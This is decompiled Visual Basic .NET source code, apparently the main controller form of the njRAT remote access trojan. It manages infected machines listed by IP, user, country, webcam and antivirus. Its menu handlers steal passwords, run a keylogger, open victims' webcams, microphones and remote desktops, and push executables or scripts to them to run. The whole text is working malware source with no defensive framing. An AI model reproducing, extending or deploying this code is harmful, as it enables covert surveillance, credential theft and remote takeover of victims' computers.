		' (set) Token: 0x060001C6 RID: 454 RVA: 0x000114F8 File Offset: 0x0000F6F8
		Friend Overridable Property RestartToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RestartToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RestartToolStripMenuItem1_Click
				If Me._RestartToolStripMenuItem1 IsNot Nothing Then
					RemoveHandler Me._RestartToolStripMenuItem1.Click, value2
				End If
				Me._RestartToolStripMenuItem1 = value
				If Me._RestartToolStripMenuItem1 IsNot Nothing Then
					AddHandler Me._RestartToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B2 RID: 178
		' (get) Token: 0x060001C7 RID: 455 RVA: 0x00011550 File Offset: 0x0000F750
		' (set) Token: 0x060001C8 RID: 456 RVA: 0x00011568 File Offset: 0x0000F768
		Friend Overridable Property ExitToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ExitToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ExitToolStripMenuItem_Click
				If Me._ExitToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._ExitToolStripMenuItem.Click, value2
				End If
				Me._ExitToolStripMenuItem = value
				If Me._ExitToolStripMenuItem IsNot Nothing Then
					AddHandler Me._ExitToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B3 RID: 179
		' (get) Token: 0x060001C9 RID: 457 RVA: 0x000115C0 File Offset: 0x0000F7C0
		' (set) Token: 0x060001CA RID: 458 RVA: 0x000115D8 File Offset: 0x0000F7D8
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				If Me._Timer1 IsNot Nothing Then
					RemoveHandler Me._Timer1.Tick, value2
				End If
				Me._Timer1 = value
				If Me._Timer1 IsNot Nothing Then
					AddHandler Me._Timer1.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170000B4 RID: 180
		' (get) Token: 0x060001CB RID: 459 RVA: 0x00011630 File Offset: 0x0000F830
		' (set) Token: 0x060001CC RID: 460 RVA: 0x00011648 File Offset: 0x0000F848
		Friend Overridable Property ToolStripStatusLabel2 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel2_Click
				If Me._ToolStripStatusLabel2 IsNot Nothing Then
					RemoveHandler Me._ToolStripStatusLabel2.Click, value2
				End If
				Me._ToolStripStatusLabel2 = value
				If Me._ToolStripStatusLabel2 IsNot Nothing Then
					AddHandler Me._ToolStripStatusLabel2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B5 RID: 181
		' (get) Token: 0x060001CD RID: 461 RVA: 0x000116A0 File Offset: 0x0000F8A0
		' (set) Token: 0x060001CE RID: 462 RVA: 0x000116B8 File Offset: 0x0000F8B8
		Friend Overridable Property ToolStripStatusLabel6 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel6_Click
				If Me._ToolStripStatusLabel6 IsNot Nothing Then
					RemoveHandler Me._ToolStripStatusLabel6.Click, value2
				End If
				Me._ToolStripStatusLabel6 = value
				If Me._ToolStripStatusLabel6 IsNot Nothing Then
					AddHandler Me._ToolStripStatusLabel6.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B6 RID: 182
		' (get) Token: 0x060001CF RID: 463 RVA: 0x00011710 File Offset: 0x0000F910
		' (set) Token: 0x060001D0 RID: 464 RVA: 0x00011728 File Offset: 0x0000F928
		Friend Overridable Property ToolStripStatusLabel7 As ToolStripStatusLabel
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripStatusLabel7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel7_Click
				If Me._ToolStripStatusLabel7 IsNot Nothing Then
					RemoveHandler Me._ToolStripStatusLabel7.Click, value2
				End If
				Me._ToolStripStatusLabel7 = value
				If Me._ToolStripStatusLabel7 IsNot Nothing Then
					AddHandler Me._ToolStripStatusLabel7.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B7 RID: 183
		' (get) Token: 0x060001D1 RID: 465 RVA: 0x00011780 File Offset: 0x0000F980
		' (set) Token: 0x060001D2 RID: 466 RVA: 0x00011798 File Offset: 0x0000F998
		Friend Overridable Property FunToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._FunToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FunToolStripMenuItem_Click
				If Me._FunToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._FunToolStripMenuItem.Click, value2
				End If
				Me._FunToolStripMenuItem = value
				If Me._FunToolStripMenuItem IsNot Nothing Then
					AddHandler Me._FunToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B8 RID: 184
		' (get) Token: 0x060001D3 RID: 467 RVA: 0x000117F0 File Offset: 0x0000F9F0
		' (set) Token: 0x060001D4 RID: 468 RVA: 0x00002B10 File Offset: 0x00000D10
		Friend Overridable Property AntiProcessToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._AntiProcessToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Me._AntiProcessToolStripMenuItem = value
			End Set
		End Property

		' Token: 0x170000B9 RID: 185
		' (get) Token: 0x060001D5 RID: 469 RVA: 0x00011808 File Offset: 0x0000FA08
		' (set) Token: 0x060001D6 RID: 470 RVA: 0x00011820 File Offset: 0x0000FA20
		Friend Overridable Property EnableToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._EnableToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.EnableToolStripMenuItem_Click
				If Me._EnableToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._EnableToolStripMenuItem.Click, value2
				End If
				Me._EnableToolStripMenuItem = value
				If Me._EnableToolStripMenuItem IsNot Nothing Then
					AddHandler Me._EnableToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BA RID: 186
		' (get) Token: 0x060001D7 RID: 471 RVA: 0x00011878 File Offset: 0x0000FA78
		' (set) Token: 0x060001D8 RID: 472 RVA: 0x00011890 File Offset: 0x0000FA90
		Friend Overridable Property SendPluginToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._SendPluginToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.SendPluginToolStripMenuItem_Click
				If Me._SendPluginToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._SendPluginToolStripMenuItem.Click, value2
				End If
				Me._SendPluginToolStripMenuItem = value
				If Me._SendPluginToolStripMenuItem IsNot Nothing Then
					AddHandler Me._SendPluginToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BB RID: 187
		' (get) Token: 0x060001D9 RID: 473 RVA: 0x000118E8 File Offset: 0x0000FAE8
		' (set) Token: 0x060001DA RID: 474 RVA: 0x00011900 File Offset: 0x0000FB00
		Friend Overridable Property OpenWebSiteFromHideToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenWebSiteFromHideToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenWebSiteFromHideToolStripMenuItem_Click
				If Me._OpenWebSiteFromHideToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._OpenWebSiteFromHideToolStripMenuItem.Click, value2
				End If
				Me._OpenWebSiteFromHideToolStripMenuItem = value
				If Me._OpenWebSiteFromHideToolStripMenuItem IsNot Nothing Then
					AddHandler Me._OpenWebSiteFromHideToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BC RID: 188
		' (get) Token: 0x060001DB RID: 475 RVA: 0x00011958 File Offset: 0x0000FB58
		' (set) Token: 0x060001DC RID: 476 RVA: 0x00011970 File Offset: 0x0000FB70
		Friend Overridable Property CoderToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._CoderToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CoderToolStripMenuItem_Click
				If Me._CoderToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._CoderToolStripMenuItem.Click, value2
				End If
				Me._CoderToolStripMenuItem = value
				If Me._CoderToolStripMenuItem IsNot Nothing Then
					AddHandler Me._CoderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x060001DD RID: 477 RVA: 0x000119C8 File Offset: 0x0000FBC8
		Public Sub New()
			AddHandler MyBase.Activated, AddressOf Me.Form1_Activated
			AddHandler MyBase.Deactivate, AddressOf Me.Form1_Deactivate
			AddHandler MyBase.FormClosing, AddressOf Me.Form1_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			Form1.__ENCAddToList(Me)
			Me.isActive = False
			Me.int_0 = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x060001DE RID: 478 RVA: 0x00011A44 File Offset: 0x0000FC44
		Public Sub dsk()
			While True
				Dim num As Integer
				Select Case Class7.class8_0.int_2
					Case 0
						num = 10
					Case 1
						num = 2000
					Case 2
						num = 5000
					Case 3
						num = 7500
					Case Else
						num = 10000
				End Select
				If Me.isActive And CULng(GClass7.smethod_0()) < 12000UL And Me.L1.Columns(0).Width <> 0 Then
					For Each dataGridViewRow As DataGridViewRow In Me.L1.method_3()
						If dataGridViewRow IsNot Nothing Then
							Dim client As Client = CType(dataGridViewRow.Tag, Client)
							If client IsNot Nothing Then
								Dim flag As Boolean = False
								If DateTime.Compare(client.lastPC, DateTime.MinValue) = 0 Then
									flag = True
								ElseIf DateAndTime.Now.Subtract(client.lastPC).TotalMilliseconds >= CDbl(num) Then
									flag = True
								End If
								If Not client.Isend AndAlso flag Then
									client.Isend = True
									client.lastPC = DateAndTime.Now
									client.Send(String.Concat(New String() { "CAP", Class7.string_1, Conversions.ToString(Me.L1.Columns(0).Width), Class7.string_1, Conversions.ToString(Me.L1.method_6()) }))
								End If
							End If
						End If
					Next
				End If
				Thread.Sleep(CInt(Math.Round(Math.Round(CDbl(num) / 2.0))))
			End While
		End Sub

		' Token: 0x060001DF RID: 479 RVA: 0x00002B19 File Offset: 0x00000D19
		Private Sub Form1_Activated(sender As Object, e As EventArgs)
			Me.isActive = True
			Me.Opacity = 1.0
		End Sub

		' Token: 0x060001E0 RID: 480 RVA: 0x00002B31 File Offset: 0x00000D31
		Private Sub Form1_Deactivate(sender As Object, e As EventArgs)
			Me.isActive = False
			Me.Opacity = 0.95
		End Sub

		' Token: 0x060001E1 RID: 481 RVA: 0x00011C24 File Offset: 0x0000FE24
		<MethodImpl(MethodImplOptions.NoOptimization)>
		Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs)
			Me.Njrat.Visible = False
			Try
				Class7.waveOut_0.Dispose()
			Catch ex As Exception
			End Try
			Class7.class8_0.method_1()
			ProjectData.EndApp()
		End Sub

		' Token: 0x060001E2 RID: 482 RVA: 0x00011C78 File Offset: 0x0000FE78
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Try
				Me.Left = 0 - Me.Width + Screen.PrimaryScreen.WorkingArea.Width
				Me.Top = 0 - Me.Height + Screen.PrimaryScreen.WorkingArea.Height
				Me.L1.method_11("Screen", L1.GEnum0.StretchImage, DataGridViewAutoSizeColumnMode.None)
				Me.L1.method_11("Name", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("IP", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("PC", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("User", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Install Date", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Flag", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Country", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Os System", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Cam", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Antivirus", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Ping", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Active Window", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.Columns(0).Width = 35
				Me.Show()
				Class7.notf_0.Show()
				Control.CheckForIllegalCrossThreadCalls = False
				Class7.form1_0 = Me
				Me.Text = Class7.string_0
				Me.Njrat.Text = Class7.string_0
				Me.Njrat.Icon = Me.Icon
				Me.ShowInTaskbar = True
				Me.Pp1.T.Enabled = True
				For Each fileName As String In Directory.GetFiles(Application.StartupPath + "\plugin\", "*.dll")
					Dim item As Class7.Class9 = New Class7.Class9(New FileInfo(fileName).Name.ToLower())
					Class7.list_1.Add(item)
				Next
				For Each text As String In Strings.Split("cam.dll,ch.dll,pw.dll,sc2.dll,mic.dll,plg.dll", ",", -1, CompareMethod.Binary)
					If Class7.smethod_0(text, Nothing) Is Nothing Then
						Interaction.MsgBox("Missing dll >> " + text, MsgBoxStyle.OkOnly, Nothing)
						Dim left As String = Strings.Split(text, ".", -1, CompareMethod.Binary)(0)
						If Operators.CompareString(left, "cam", False) = 0 Then
							Me.RemoteCamToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "ch", False) = 0 Then
							Me.OpenChatToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "plg", False) = 0 Then
							Me.ManagerToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "pw", False) = 0 Then
							Me.GetPasswordsToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "sc2", False) = 0 Then
							Me.RemoteDesktopToolStripMenuItem.Enabled = False
						ElseIf Operators.CompareString(left, "mic", False) = 0 Then
							Me.MicrophoneToolStripMenuItem.Enabled = False
						End If
					End If
				Next
				Try
					Class7.waveOut_0 = New WaveOut(0)
					Class7.waveOut_0.Open(WaveFormat.Pcm8Khz8BitMono)
					Class7.waveOut_1 = New WaveOut(0)
					Class7.waveOut_1.Open(WaveFormat.Pcm44Khz16BitMono)
				Catch ex As Exception
					Me.MicrophoneToolStripMenuItem.Enabled = False
				End Try
				Class7.class8_0.method_0()
				While True
					Try
						Dim port As port = New port()
						port.TextBox1.Text = Class6.smethod_2("port", "5552")
						port.ShowDialog(Me)
						If port.port < 1 Then
							Me.Close()
							Return
						End If
						Me.port = port.port
						Me.S = New SK(Me.port)
						Class6.smethod_3("port", Conversions.ToString(Me.port))
						Exit Try
					Catch ex2 As Exception
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, Nothing)
					End Try
				End While
				Class7.sk_0 = Me.S
				Dim thread As Thread = AddressOf Me.dsk
				thread.Start()
				Me.Timer1.Enabled = True
			Catch ex3 As Exception
			End Try
		End Sub

		' Token: 0x060001E3 RID: 483 RVA: 0x00012134 File Offset: 0x00010334
		Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs)
			If Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(Me.ToolStripStatusLabel1.Tag), "2", False) Then
				Me.ToolStripStatusLabel1.Text = "[ Logs ]"
				Me.ToolStripStatusLabel1.Tag = "1"
				Me.L1.BringToFront()
			Else
				Me.ToolStripStatusLabel1.Text = "[ Users ]"
				Me.ToolStripStatusLabel1.Tag = "2"
				Me.Pp1.BringToFront()
			End If
		End Sub

		' Token: 0x060001E4 RID: 484 RVA: 0x000121B8 File Offset: 0x000103B8
		Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					Try
						NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "CN", New Object() { False }, Nothing, Nothing, False, True)
					Catch ex As Exception
					End Try
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001E5 RID: 485 RVA: 0x00012268 File Offset: 0x00010468
		Private Sub RemoteCamToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("cam.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001E6 RID: 486 RVA: 0x000122FC File Offset: 0x000104FC
		Private Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("pw.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, True)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001E7 RID: 487 RVA: 0x00012390 File Offset: 0x00010590
		Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "kl" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001E8 RID: 488 RVA: 0x00002B49 File Offset: 0x00000D49
		Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs)
			MyProject.Forms.About.ShowDialog()
		End Sub

		' Token: 0x060001E9 RID: 489 RVA: 0x0001241C File Offset: 0x0001061C
		Private Sub OpenChatToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("ch.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001EA RID: 490 RVA: 0x000124B0 File Offset: 0x000106B0
		Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				If Not Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing)))) Then
					Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				End If
				Dim array As Object() = New Object(0) {}
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag)
				array(0) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				Dim array2 As Object() = array
				Dim array3 As Boolean() = New Boolean() { True }
				NewLateBinding.LateCall(Nothing, GetType(Process), "Start", array2, Nothing, Nothing, array3, True)
				If array3(0) Then
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), Nothing, "folder", New Object() { RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2(0)))) }, Nothing, Nothing, True, True)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001EB RID: 491 RVA: 0x00012624 File Offset: 0x00010824
		Private Sub FromLINKToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				If openFileDialog.ShowDialog() = DialogResult.OK Then
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "rn" + Class7.string_1 + New FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x060001EC RID: 492 RVA: 0x00012724 File Offset: 0x00010924
		Private Sub FromDISKToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "EXE|*.exe", .FileName = String.Empty }
				If openFileDialog.ShowDialog() = DialogResult.OK Then
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "up" + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x060001ED RID: 493 RVA: 0x00012810 File Offset: 0x00010A10
		Private Sub ScriptToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim script As script = New script()
				script.ShowDialog(Me)
				If script.Code.Length > 0 Then
					Dim flag As Boolean = True
					Dim array As Byte() = Class6.smethod_8(Class6.smethod_11(script.Code), flag)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim memoryStream2 As MemoryStream = memoryStream
					Dim text As String = "rn" + Class7.string_1 + script.RunAs + Class7.string_1
					Dim buffer As Byte() = Class6.smethod_11(text)
					Dim offset As Integer = 0
					Dim text2 As String = "rn" + Class7.string_1 + script.RunAs + Class7.string_1
					memoryStream2.Write(buffer, offset, Class6.smethod_11(text2).Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x060001EE RID: 494 RVA: 0x00012918 File Offset: 0x00010B18
		Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If MessageBox.Show("Are you sure To want to Uninstall Server ?", "Unistall", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) = DialogResult.Yes Then
				Dim thread As Thread = AddressOf Class7.smethod_4
				Dim thread2 As Thread = thread
				Dim array As Object() = New Object(1) {}
				Dim array2 As Object() = array
				Dim num As Integer = 0
				Dim text As String = "un" + Class7.string_1 + "~"
				array2(num) = Class6.smethod_11(text)
				array(1) = Me.L1.DefaultCellStyle.ForeColor
				thread2.Start(array)
			End If
		End Sub

		' Token: 0x060001EF RID: 495 RVA: 0x00012994 File Offset: 0x00010B94
		Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs)
			If Me.L1.SelectedRows.Count <> 0 Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("mic.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					If TypeOf enumerator Is IDisposable Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x060001F0 RID: 496 RVA: 0x00012A28 File Offset: 0x00010C28
		Private Sub ToolStripStatusLabel5_Click(sender As Object, e As EventArgs)
			Dim stng As STNG = New STNG() With { .StartPosition = FormStartPosition.CenterParent }
			stng.ShowDialog()
		End Sub

		' Token: 0x060001F1 RID: 497 RVA: 0x00012A4C File Offset: 0x00010C4C
		Private Sub ManagerToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					Dim client As Client = CType(dataGridViewRow.Tag, Client)
					If client IsNot Nothing Then
						Dim manager As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
						If manager Is Nothing Then
							manager = New Manager() With { .sk = client, .Name = "m" + client.ip() }
							manager.Show()
						Else
							manager.WindowState = FormWindowState.Minimized
							manager.WindowState = FormWindowState.Normal
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				If TypeOf enumerator Is IDisposable Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060001F2 RID: 498 RVA: 0x00012B28 File Offset: 0x00010D28
		Private Sub L1_ColumnWidthChanged(sender As Object, e As DataGridViewColumnEventArgs)
			If e.Column.Index = 0 Then
				If e.Column.Width > 250 Then
					e.Column.Width = 250
				End If
				If e.Column.Width < 35 Then
					e.Column.Width = 35
				End If
				Me.L1.method_7(CInt(Math.Round(Math.Round(CDbl(e.Column.Width) * 0.67))))
			End If
		End Sub

		' Token: 0x060001F3 RID: 499 RVA: 0x00012BB4 File Offset: 0x00010DB4
		Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs)
			Try
				Interaction.AppActivate(Me.Text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001F4 RID: 500 RVA: 0x00012BB4 File Offset: 0x00010DB4
		Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Interaction.AppActivate(Me.Text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060001F5 RID: 501 RVA: 0x00002B5B File Offset: 0x00000D5B
		Private Sub RestartToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Process.Start(Application.ExecutablePath)
			Me.Close()
		End Sub

		' Token: 0x060001F6 RID: 502 RVA: 0x0000276C File Offset: 0x0000096C
		Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.Close()
		End Sub

		' Token: 0x060001F7 RID: 503 RVA: 0x00012BF0 File Offset: 0x00010DF0
		Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim array2 As Object() = array
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "@"
			array2(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

